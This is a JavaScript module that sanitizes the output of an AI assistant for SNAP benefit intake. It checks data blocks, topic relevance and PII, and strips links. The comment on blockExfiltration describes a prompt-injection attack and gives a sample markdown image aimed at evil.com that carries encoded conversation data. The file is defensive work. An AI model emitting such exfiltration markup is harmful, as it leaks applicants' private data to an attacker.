/**
 * Output Sanitizer — multi-layer AI output defense.
 *
 * Responsibilities (aligned with OWASP LLM Top 10 2025):
 * 1. Sanitize user input before storing in conversation logs (stored XSS prevention)
 * 2. Sanitize AI responses to prevent injected CUSHION_DATA blocks
 * 3. Detect off-topic AI responses (topic-relevance guardrail)
 * 4. Scan AI output for PII leakage (defense-in-depth output DLP)
 * 5. Block markdown image/URL exfiltration attacks
 */

/**
 * Sanitize text for safe HTML display by escaping dangerous characters.
 * Used before storing user messages in conversation logs.
 */
function sanitizeForDisplay(text) {
  if (typeof text !== "string") return "";
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}

/**
 * Validate the number of CUSHION_DATA blocks in an AI response.
 * A single conversational turn should produce at most a few data blocks.
 * An excessive number suggests prompt injection or model misbehavior.
 *
 * @param {string} aiResponse - Raw AI response text
 * @param {number} maxBlocks - Maximum allowed data blocks per response
 * @returns {{ safe: boolean, count: number }}
 */
const MAX_DATA_BLOCKS_PER_RESPONSE = 5;

function validateDataBlockCount(aiResponse, maxBlocks = MAX_DATA_BLOCKS_PER_RESPONSE) {
  const matches = aiResponse.match(/<!--CUSHION_DATA:/g) || [];
  return {
    safe: matches.length <= maxBlocks,
    count: matches.length,
  };
}

/**
 * Sanitize AI response data blocks by stripping any that contain
 * suspicious content (e.g., nested HTML comments, script tags, or
 * attempts to inject additional data blocks).
 *
 * @param {string} aiResponse - Raw AI response text
 * @returns {string} - Cleaned AI response
 */
function sanitizeAIResponse(aiResponse) {
  if (typeof aiResponse !== "string") return "";

  // Strip any data blocks that contain nested HTML comments (injection attempt)
  let cleaned = aiResponse.replace(
    /<!--CUSHION_DATA:(.*?)-->/g,
    (fullMatch, jsonContent) => {
      // Reject blocks containing nested comments or script-like content
      if (jsonContent.includes("<!--") || jsonContent.includes("-->")) {
        return "";
      }
      if (/<script/i.test(jsonContent)) {
        return "";
      }
      // Verify it's valid JSON
      try {
        JSON.parse(jsonContent);
        return fullMatch;
      } catch {
        return "";
      }
    }
  );

  return cleaned;
}

/**
 * Topic-relevance guardrail: detect when AI response has gone off-topic.
 * A SNAP intake assistant should only discuss SNAP, benefits, household,
 * income, expenses, and the intake process. Responses about unrelated
 * topics suggest successful prompt injection or model drift.
 *
 * Uses keyword-density scoring: the response must contain enough
 * on-topic vocabulary relative to its length.
 *
 * @param {string} aiResponse - The AI's display message (no data blocks)
 * @returns {{ onTopic: boolean, score: number, reason?: string }}
 */
const ON_TOPIC_KEYWORDS = [
  "snap", "benefit", "household", "income", "expense", "applicant",
  "member", "rent", "mortgage", "utility", "shelter", "deduction",
  "employment", "employer", "wage", "salary", "caseworker",
  "application", "eligible", "eligibility", "food", "assistance",
  "document", "pay", "self-employment", "disability", "elderly",
  "social security", "ssi", "ssdi", "pension", "child support",
  "dependent", "medical", "interview", "office", "dfcs", "county",
  "question", "information", "collect", "verify", "review",
];

// Short responses (greetings, confirmations) are exempt from topic checking
const TOPIC_CHECK_MIN_LENGTH = 80;
// Minimum ratio of on-topic keyword matches to total words
const TOPIC_SCORE_THRESHOLD = 0.03;

function checkTopicRelevance(aiResponse) {
  if (typeof aiResponse !== "string" || aiResponse.length < TOPIC_CHECK_MIN_LENGTH) {
    return { onTopic: true, score: 1.0 };
  }

  const lower = aiResponse.toLowerCase();
  const words = lower.split(/\s+/).filter((w) => w.length > 2);
  if (words.length === 0) return { onTopic: true, score: 1.0 };

  let matches = 0;
  for (const keyword of ON_TOPIC_KEYWORDS) {
    if (lower.includes(keyword)) matches++;
  }

  const score = matches / words.length;
  if (score < TOPIC_SCORE_THRESHOLD && matches < 2) {
    return {
      onTopic: false,
      score,
      reason: `Low topic relevance (score: ${score.toFixed(4)}, matches: ${matches})`,
    };
  }

  return { onTopic: true, score };
}

/**
 * Output PII scanner: catch PII the model might generate in its response.
 * This is defense-in-depth — the system prompt instructs the model not to
 * collect PII, but we verify the output anyway.
 *
 * @param {string} aiResponse - The AI's display message
 * @returns {{ clean: boolean, piiFound: string[] }}
 */
function scanOutputForPII(aiResponse) {
  if (typeof aiResponse !== "string") return { clean: true, piiFound: [] };

  const piiFound = [];

  // SSN patterns (full or partial)
  if (/\b\d{3}-\d{2}-\d{4}\b/.test(aiResponse)) {
    piiFound.push("SSN");
  }

  // Phone numbers
  if (/\b\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b/.test(aiResponse)) {
    piiFound.push("phone_number");
  }

  // Email addresses
  if (/\b[\w.-]+@[\w.-]+\.\w{2,}\b/.test(aiResponse)) {
    piiFound.push("email");
  }

  // Full street addresses (number + street name + suffix)
  if (/\b\d+\s+[A-Z][a-zA-Z]+\s+(?:St|Ave|Blvd|Dr|Rd|Ln|Way|Ct|Pl|Pkwy)\b/i.test(aiResponse)) {
    piiFound.push("street_address");
  }

  // Date of birth patterns (MM/DD/YYYY, MM-DD-YYYY)
  if (/\b(?:0?[1-9]|1[0-2])[\/-](?:0?[1-9]|[12]\d|3[01])[\/-](?:19|20)\d{2}\b/.test(aiResponse)) {
    piiFound.push("date_of_birth");
  }

  // Credit card numbers (13-19 digits, optionally with dashes/spaces)
  if (/\b(?:\d[ -]*?){13,19}\b/.test(aiResponse)) {
    // Verify it's not a normal number by checking Luhn or length
    const digits = aiResponse.match(/\b(?:\d[ -]*?){13,19}\b/);
    if (digits && digits[0].replace(/\D/g, "").length >= 13) {
      piiFound.push("possible_credit_card");
    }
  }

  return { clean: piiFound.length === 0, piiFound };
}

/**
 * Exfiltration blocker: detect and strip markdown images and URLs
 * that could encode conversation data in query parameters.
 *
 * Attack vector: prompt injection causes the model to output
 * ![](https://evil.com/steal?data=<encoded_conversation_data>)
 * When the client renders this, it makes an HTTP request to the
 * attacker's server, leaking the data.
 *
 * @param {string} aiResponse - The AI's display message
 * @returns {{ safe: boolean, cleaned: string, threats: string[] }}
 */
function blockExfiltration(aiResponse) {
  if (typeof aiResponse !== "string") return { safe: true, cleaned: "", threats: [] };

  const threats = [];
  let cleaned = aiResponse;

  // Block markdown images with external URLs
  const markdownImageRegex = /!\[([^\]]*)\]\(https?:\/\/[^)]+\)/gi;
  if (markdownImageRegex.test(cleaned)) {
    threats.push("markdown_image_exfiltration");
    cleaned = cleaned.replace(markdownImageRegex, "[image removed for security]");
  }

  // Block HTML image tags
  const htmlImageRegex = /<img[^>]+src\s*=\s*["']https?:\/\/[^"']+["'][^>]*>/gi;
  if (htmlImageRegex.test(cleaned)) {
    threats.push("html_image_exfiltration");
    cleaned = cleaned.replace(htmlImageRegex, "[image removed for security]");
  }

  // Block URLs with suspiciously long query strings (data exfiltration via URL params)
  const longQueryUrlRegex = /https?:\/\/[^\s"'<>]+\?[^\s"'<>]{100,}/gi;
  if (longQueryUrlRegex.test(cleaned)) {
    threats.push("url_query_exfiltration");
    cleaned = cleaned.replace(longQueryUrlRegex, "[URL removed for security]");
  }

  // Block any external URLs entirely (a SNAP intake assistant has no reason to output URLs)
  const externalUrlRegex = /https?:\/\/(?!localhost)[^\s"'<>]+/gi;
  if (externalUrlRegex.test(cleaned)) {
    threats.push("external_url");
    cleaned = cleaned.replace(externalUrlRegex, "[link removed]");
  }

  return { safe: threats.length === 0, cleaned, threats };
}

module.exports = {
  sanitizeForDisplay,
  validateDataBlockCount,
  sanitizeAIResponse,
  MAX_DATA_BLOCKS_PER_RESPONSE,
  checkTopicRelevance,
  scanOutputForPII,
  blockExfiltration,
  ON_TOPIC_KEYWORDS,
  TOPIC_CHECK_MIN_LENGTH,
  TOPIC_SCORE_THRESHOLD,
};
